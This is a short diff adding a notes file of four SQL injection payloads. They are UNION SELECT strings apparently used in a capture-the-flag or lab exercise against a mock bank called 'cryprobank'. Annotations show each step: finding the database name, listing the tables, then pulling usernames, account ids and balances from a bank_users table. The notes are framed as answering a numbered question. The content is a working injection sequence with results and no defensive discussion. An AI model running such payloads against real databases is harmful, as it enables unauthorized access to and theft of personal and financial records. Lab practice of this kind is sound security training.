@@ -1,0 +1,4 @@
+' UNION SELECT '1',DATABASE(),'3','4' # 					 --> cryprobank
+' UNION SELECT '1',table_name,'3','4' FROM information_schema.tables#		 --> bank_users, cookies, transaction, ADMINISTRABLE_ROLE_AUTHORIZATIONS, etc etc
+' UNION SELECT '1',id,'3','4' FROM bank_users WHERE account_id=1192946152#			 --> search for specific user id, will use this for the id balance check
+' UNION SELECT username,account_id,amount,'4' FROM bank_users WHERE account_id=1192946152#	--> answer to question 2
